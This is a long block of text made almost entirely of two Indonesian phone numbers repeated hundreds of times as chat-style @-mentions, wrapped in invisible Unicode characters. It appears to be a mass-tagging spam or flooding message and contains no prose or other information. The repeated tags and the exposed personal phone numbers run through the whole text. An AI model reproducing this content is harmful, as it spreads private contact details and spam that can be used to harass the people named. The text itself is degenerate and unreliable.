851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ 